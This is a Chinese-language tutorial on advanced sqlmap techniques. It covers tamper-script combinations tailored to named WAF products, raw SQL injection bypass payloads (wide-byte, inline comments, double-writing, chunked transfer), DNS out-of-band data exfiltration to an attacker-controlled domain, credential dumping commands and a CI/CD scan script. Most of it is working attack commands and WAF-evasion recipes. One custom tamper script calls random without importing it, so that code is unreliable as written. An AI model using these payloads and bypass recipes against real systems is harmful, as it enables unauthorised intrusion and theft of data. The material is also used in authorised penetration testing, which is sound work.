# sqlmap 高级技巧和绕过技术

> 本文整理了 sqlmap 的高级使用技巧、WAF 绕过方法和各种提升效率的技术。

---

## 一、WAF 绕过技术详解

### 1.1 WAF 检测原理

**WAF 检测 SQL 注入的常见方式：**

```
1. 关键字匹配
   - 检测 UNION、SELECT、OR、AND 等 SQL 关键字
   - 检测单引号、分号、注释符等特殊字符
   
2. 正则表达式匹配
   - 匹配常见注入 Payload 模式
   - 如：'.*union.*select.*'
   
3. 行为分析
   - 异常请求频率
   - 异常参数格式
   - 大量 403/500 响应
   
4. 机器学习
   - 基于历史数据训练模型
   - 识别异常请求模式
```

### 1.2 绕过方法分类

| 分类 | 原理 | 代表 tamper |
|------|------|------------|
| **编码绕过** | 对 payload 进行编码，绕过特征匹配 | charencode, charunicodeencode, base64encode |
| **大小写绕过** | 利用大小写不敏感，混淆关键字 | randomcase, uppercase, lowercase |
| **注释绕过** | 在关键字中插入注释，绕过检测 | space2comment, randomcomments |
| **空格替换** | 替换空格为其他字符/空白 | space2hash, space2dash, space2plus |
| **关键字替换** | 用等价函数/语法替换关键字 | between, greatest, equaltolike, ifnull2ifisnull |
| **特殊字符** | 利用特殊字符混淆 payload | apostrophemask, percentage, overlongutf8 |
| **结构绕过** | 改变请求结构，绕过检测 | --hpp（参数污染）、分块传输 |

## 二、Tamper 脚本高级用法

### 2.1 常用 Tamper 组合推荐

**针对不同 WAF 产品的推荐组合：**

```bash
# ModSecurity / OWASP CRS
sqlmap -u "..." --tamper=space2comment,modsecurityversioned,modsecurityzeroversioned,randomcase,charencode

# Cloudflare WAF
sqlmap -u "..." --tamper=space2comment,charencode,charunicodeencode,randomcase,between

# 阿里云盾
sqlmap -u "..." --tamper=space2comment,charencode,randomcase,between,greatest,percentage,charunicodeencode

# 安全狗
sqlmap -u "..." --tamper=space2morehash,randomcase,charencode,apostrophemask,between

# 腾讯云 WAF
sqlmap -u "..." --tamper=space2comment,randomcase,charencode,charunicodeencode,versionedmorekeywords

# AWS WAF
sqlmap -u "..." --tamper=space2comment,charencode,between,xforwardedfor,greatest

# 通用强组合（最全面，先试这个）
sqlmap -u "..." --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage,versionedmorekeywords
```

### 2.2 自定义 Tamper 脚本

**基础模板：**
```python
# 自定义 tamper 脚本模板
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    """声明依赖"""
    pass

def tamper(payload, **kwargs):
    """
    修改 payload 绕过 WAF
    
    参数:
        payload: 原始 SQL 注入 payload
        kwargs: 额外参数（headers 等）
    
    返回:
        修改后的 payload
    """
    retVal = payload
    
    if payload:
        # 在这里添加修改逻辑
        retVal = retVal.replace(" ", "/**/")
    
    return retVal
```

**高级示例：多重绕过组合**
```python
# 组合多种绕过策略
from lib.core.enums import PRIORITY
from lib.core.common import singleRandom

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """高级组合绕过"""
    retVal = ""
    
    if payload:
        # 1. 关键字中间插入注释
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]
        for kw in keywords:
            mid = len(kw) // 2
            payload = payload.replace(kw, kw[:mid] + "/**/" + kw[mid:])
            payload = payload.replace(kw.lower(), kw[:mid].lower() + "/**/" + kw[mid:].lower())
        
        # 2. 空格随机替换
        space_variants = ["/**/", "%0a", "%0d", "%09", "%0c", "%a0"]
        parts = payload.split(" ")
        for i, part in enumerate(parts):
            retVal += part
            if i < len(parts) - 1:
                retVal += singleRandom(space_variants)
        
        # 3. 大小写随机转换
        result = ""
        for char in retVal:
            if char.isalpha():
                if random.random() > 0.5:
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char
        retVal = result
    
    return retVal
```

### 2.3 Tamper 执行顺序

```
tamper 按优先级执行：
PRIORITY.LOWEST  → 最先执行
PRIORITY.LOWER
PRIORITY.LOW
PRIORITY.NORMAL  → 默认
PRIORITY.HIGH
PRIORITY.HIGHER
PRIORITY.HIGHEST → 最后执行

使用多个 tamper 时：
  按优先级从低到高依次执行
  同级 tamper 按命令行中的顺序执行
```

## 三、注入绕过高级技巧

### 3.1 内联注释绕过（MySQL）

```sql
-- MySQL 版本注释
/*!50000SELECT*/ 1,2,3-- 
-- 如果 MySQL 版本 >= 5.00.00，则执行 SELECT

-- 通用内联注释
/*!UNION SELECT*/ 1,2,3-- 
-- 大多数 WAF 会检测 UNION SELECT
-- 但放在 /*! */ 中可能绕过

sqlmap 对应 tamper：
- versionedkeywords
- versionedmorekeywords
- halfversionedmorekeywords
```

### 3.2 宽字节注入

```sql
-- 原理：利用字符编码转换
-- 场景：magic_quotes_gpc 开启时，单引号被转义为 \'
-- 使用宽字节吃掉反斜杠

-- 示例：
id=1%df' 
-- %df 加上转义的 \ (%5c) 组成 %df%5c
-- 在 GBK 编码中 %df%5c 是一个合法字符"運"
-- 这样单引号就逃逸出来了

sqlmap 对应 tamper：
- unmagicquotes
```

### 3.3 双写绕过

```sql
-- 原理：WAF 只做一次关键字替换/删除
-- 双写后，删除一次还剩一次

-- 示例：
SELSELECTECT → 删除中间 SELECT → SELECT
UNUNIONION → 删除中间 UNION → UNION
OORR → 删除中间 OR → OR

sqlmap 对应 tamper：
- nonrecursivereplacement
```

### 3.4 HTTP 参数污染（HPP）

```
原理：
  WAF 和后端对重复参数的处理方式不同
  WAF 可能只检查第一个参数的值
  后端可能使用第二个参数的值

示例：
  ?id=1&id=1' UNION SELECT...

使用：
  sqlmap -u "..." --hpp

不同后端处理：
  PHP/Apache → 使用最后一个值
  JSP/Tomcat → 使用第一个值
  ASP/IIS → 所有值拼接
```

### 3.5 分块传输绕过

```
原理：
  使用 Transfer-Encoding: chunked
  将请求体分成多个小块
  WAF 可能不重组分块数据

示例请求：
  POST /login HTTP/1.1
  Host: target.com
  Transfer-Encoding: chunked
  Content-Type: application/x-www-form-urlencoded
  
  5
  id=1'
  6
   UNION
  3
  SEL
  4
  ECT 
  0

实现：
  使用 Burp 的分块传输插件
  或自定义脚本实现
```

### 3.6 其他绕过技巧

```sql
-- 1. 科学计数法
id=1e0 UNION SELECT...

-- 2. 括号代替空格
SELECT(password)FROM(users)WHERE(id=1)

-- 3. 反引号（MySQL）
SELECT `password` FROM `users`

-- 4. @符号（MySQL 变量）
id=1 AND 1=@`version`

-- 5. 换行符绕过
SELECT
password
FROM
users

-- 6. 缓冲区溢出绕过
-- 某些 WAF 有长度限制
-- 超长 payload 可能绕过检测
```

## 四、性能优化技巧

### 4.1 加速扫描

```bash
# 1. 增加线程数
sqlmap -u "..." --threads=10
sqlmap -u "..." --threads=20
# 注意：线程太多可能被封 IP

# 2. 减少延迟
sqlmap -u "..." --delay=0
# 默认 0 延迟

# 3. 减少超时
sqlmap -u "..." --timeout=10
# 默认 30 秒

# 4. 减少重试
sqlmap -u "..." --retries=0
# 默认重试 3 次

# 5. 只测试指定参数
sqlmap -u "...?id=1&cat=2&page=3" -p id
# 减少测试的参数数量

# 6. 指定数据库类型
sqlmap -u "..." --dbms=mysql
# 跳过数据库类型检测

# 7. 指定注入技术
sqlmap -u "..." --technique=U
# 只使用联合查询（最快）

# 8. 使用 --smart 智能检测
sqlmap -u "..." --smart
# 启发式检测，只对可能的参数深入测试
```

### 4.2 时间盲注优化

```bash
# 1. 减少延迟时间
sqlmap -u "..." --technique=T --time-sec=2
# 默认 5 秒，可尝试减少到 2-3 秒
# 如果环境稳定，甚至可以 1 秒

# 2. 增加线程
sqlmap -u "..." --technique=T --threads=10

# 3. 减少获取的数据量
# 只获取关键表和列
sqlmap -u "..." -D db -T users -C username,password --dump

# 4. 使用二分法（sqlmap 自动使用）
# 每字节 log2(128) ≈ 7 次请求
# 比逐字符尝试快很多
```

### 4.3 批量扫描优化

```bash
# 1. 使用 -m 批量扫描
sqlmap -m urls.txt --batch --threads=5

# 2. 先快速检测，再深入利用
# 第一阶段：快速检测所有 URL
sqlmap -m urls.txt --batch --level=1 --smart

# 第二阶段：对有注入的 URL 深入利用
# 从输出目录中提取有漏洞的 URL

# 3. 使用 sqlmap API
# 分布式扫描，多机并行
```

## 五、高级功能使用

### 5.1 DNS 带外数据提取

```bash
# 场景：盲注太慢，或无法直接回显数据
# 原理：通过 DNS 查询将数据带出到攻击者控制的 DNS 服务器

# 使用条件：
# 1. 攻击者控制一个域名（如 attacker.com）
# 2. 攻击者有一个公网 DNS 服务器
# 3. 目标服务器能发起 DNS 查询

# 使用方法：
sqlmap -u "http://target.com/page?id=1" \
       --dns-domain="attacker.com" \
       --batch

# 工作流程：
# 1. sqlmap 构造 DNS 查询 payload
# 2. 目标数据库执行查询，触发 DNS 请求
# 3. DNS 请求的子域名中编码了数据
# 4. 攻击者 DNS 服务器记录查询
# 5. sqlmap 解析 DNS 日志获取数据

# 适用数据库：
# - MySQL（Windows 下 UNC 路径）
# - Oracle（UTL_HTTP、DNS 解析）
# - PostgreSQL（dblink 扩展）
# - MSSQL（xp_dirtree 等）
```

### 5.2 sqlmap API 模式

```bash
# 启动 API 服务
python sqlmapapi.py -s -p 8775

# API 端点：
# POST /task/new           创建新任务
# GET  /task/<id>/delete   删除任务
# POST /option/<id>/set    设置选项
# GET  /option/<id>/list   列出选项
# POST /scan/<id>/start    开始扫描
# GET  /scan/<id>/stop     停止扫描
# GET  /scan/<id>/status   扫描状态
# GET  /scan/<id>/data     扫描结果
# GET  /scan/<id>/log      扫描日志
```

**Python 客户端示例：**
```python
import requests
import time

API = "http://127.0.0.1:8775"

# 创建任务
task_id = requests.post(f"{API}/task/new").json()["taskid"]

# 设置选项
options = {
    "url": "http://target.com/page?id=1",
    "level": 3,
    "risk": 2,
    "batch": True,
    "randomAgent": True,
}
requests.post(f"{API}/option/{task_id}/set", json=options)

# 启动扫描
requests.post(f"{API}/scan/{task_id}/start")

# 轮询状态
while True:
    status = requests.get(f"{API}/scan/{task_id}/status").json()
    if status["status"] == "terminated":
        break
    time.sleep(5)

# 获取结果
result = requests.get(f"{API}/scan/{task_id}/data").json()
print(result)
```

### 5.3 爬虫功能

```bash
# 爬取网站并自动测试
sqlmap -u "http://target.com" --crawl=2 --batch

# 爬取深度
# --crawl=1: 只爬取首页链接
# --crawl=2: 爬取两级链接
# --crawl=3: 爬取三级链接

# 排除特定路径
sqlmap -u "http://target.com" --crawl=2 --crawl-exclude="logout" --batch

# 爬取 + 表单测试
sqlmap -u "http://target.com" --crawl=2 --forms --batch

# 爬取深度 + 线程
sqlmap -u "http://target.com" --crawl=3 --crawl-depth=3 --threads=5 --batch
```

### 5.4 二次注入高级用法

```bash
# 基础二次注入
sqlmap -u "http://target.com/register" \
       --data="username=test*&password=123" \
       --second-url="http://target.com/profile" \
       --batch

# 高级：second-request（更灵活）
# 可以自定义第二个请求的内容
sqlmap -u "http://target.com/register" \
       --data="username=test*&password=123" \
       --second-url="http://target.com/profile" \
       --second-req=second_request.txt \
       --batch

# 应用场景：
# - 注册 → 个人信息展示
# - 留言 → 后台查看留言
# - 订单 → 订单详情页
# - 任何"输入 → 存储 → 展示"的场景
```

### 6.1 MySQL 注入绕过组合

```bash
# 组合一：入门级（简单 WAF）
sqlmap -u "..." --tamper=space2comment,randomcase --random-agent --batch

# 组合二：进阶级（中等 WAF）
sqlmap -u "..." \
       --tamper=space2comment,randomcase,charencode,between,versionedmorekeywords \
       --random-agent --delay=0.5 --batch

# 组合三：高手级（强 WAF）
sqlmap -u "..." \
       --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage,versionedmorekeywords,halfversionedmorekeywords \
       --random-agent --delay=1 --timeout=30 --retries=2 --threads=1 --batch

sqlmap -u "..." \
       --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage,versionedmorekeywords,apostrophemask,modsecurityversioned,securesphere \
       --random-agent --delay=2 --timeout=60 --retries=3 --threads=1 -v 3 --batch
```

## 七、自定义 Payload 与检测逻辑

### 7.1 自定义注入标记

```bash
# 使用 * 手动标记注入点

# GET URL 中
sqlmap -u "http://target.com/page?id=1*&cat=2"

# POST 数据中
sqlmap -u "http://target.com/search" \
       --data="q=test*&page=1"

# Cookie 中
sqlmap -u "http://target.com/" \
       --cookie="session=abc; id=1*" \
       --level=2

# Header 中
sqlmap -u "http://target.com/" \
       --headers="X-Forwarded-For: 1*\nUser-Agent: *" \
       --level=3

# URL 路径中（伪静态）
sqlmap -u "http://target.com/article/1*.html"
```

### 7.2 自定义前缀后缀

```bash
# 场景：注入点需要特定的闭合语法

# 单引号 + 括号
sqlmap -u "..." --prefix="')" --suffix="-- "
# 生成：1') UNION SELECT 1,2,3-- 

# 双引号
sqlmap -u "..." --prefix='"' --suffix='-- '
# 生成：1" UNION SELECT 1,2,3-- 

# 多重闭合
sqlmap -u "..." --prefix="'))" --suffix=" AND (('1'='1"
```

### 7.3 跳过特定 payload

```bash
# 跳过包含特定关键字的 payload
# 某些 payload 会触发 WAF，可以跳过

sqlmap -u "..." --test-skip="BENCHMARK" --batch
sqlmap -u "..." --test-skip="SLEEP" --batch
sqlmap -u "..." --test-skip="BENCHMARK,SLEEP,WAITFOR" --batch

# 查看可用的 payload 类型
sqlmap -u "..." -v 3 --batch
# 可以看到使用的 payload 名称
```

### 9.3 CI/CD 集成

```python
# 在 CI/CD 流水线中集成 sqlmap
# 示例：Python 脚本调用 sqlmap API 进行安全测试

import requests
import time

def sqlmap_scan(url, api_url="http://127.0.0.1:8775"):
    # 创建任务
    task_id = requests.post(f"{api_url}/task/new").json()["taskid"]
    
    # 设置选项
    options = {
        "url": url,
        "level": 2,
        "risk": 1,
        "batch": True,
        "randomAgent": True,
    }
    requests.post(f"{api_url}/option/{task_id}/set", json=options)
    
    # 启动扫描
    requests.post(f"{api_url}/scan/{task_id}/start")
    
    # 等待完成
    while True:
        status = requests.get(f"{api_url}/scan/{task_id}/status").json()
        if status["status"] == "terminated":
            break
        time.sleep(10)
    
    # 获取结果
    result = requests.get(f"{api_url}/scan/{task_id}/data").json()
    
    # 清理
    requests.delete(f"{api_url}/task/{task_id}/delete")
    
    return len(result.get("data", [])) > 0

# 在 CI 中使用
if sqlmap_scan("https://staging.example.com/api/test?id=1"):
    print("SQL injection found!")
    exit(1)  # 失败
else:
    print("No SQL injection found")
    exit(0)  # 通过
```
